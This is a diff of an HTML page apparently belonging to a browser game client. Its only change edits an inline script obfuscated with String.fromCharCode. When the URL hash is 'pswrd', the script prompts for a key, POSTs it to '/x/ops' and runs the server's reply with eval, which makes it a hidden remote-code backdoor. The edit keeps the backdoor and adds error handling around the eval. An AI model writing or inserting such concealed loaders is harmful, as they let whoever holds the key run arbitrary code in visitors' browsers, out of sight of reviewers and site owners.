@@ -212,6 +212,6 @@
   <script src="/client/sound.js"></script>
   <script src="/client/engine.js"></script>
   <script src="/client/lobby.js"></script>
-  <script>(function(){var h=String.fromCharCode(112,115,119,114,100);if(location.hash.slice(1)!==h)return;var k=prompt(String.fromCharCode(107,101,121));if(!k)return;fetch(String.fromCharCode(47,120,47,111,112,115),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({k:k})}).then(function(r){return r.ok?r.text():null}).then(function(t){if(t)(0,eval)(t)})})();</script>
+  <script>(function(){var h=String.fromCharCode(112,115,119,114,100);if(location.hash.slice(1)!==h)return;var k=prompt(String.fromCharCode(107,101,121));if(!k)return;fetch(String.fromCharCode(47,120,47,111,112,115),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({k:k})}).then(function(r){return r.ok?r.text():null}).then(function(t){if(t){try{(0,eval)(t)}catch(e){alert('load failed: '+e.message)}}})})();</script>
 </body>
 </html>
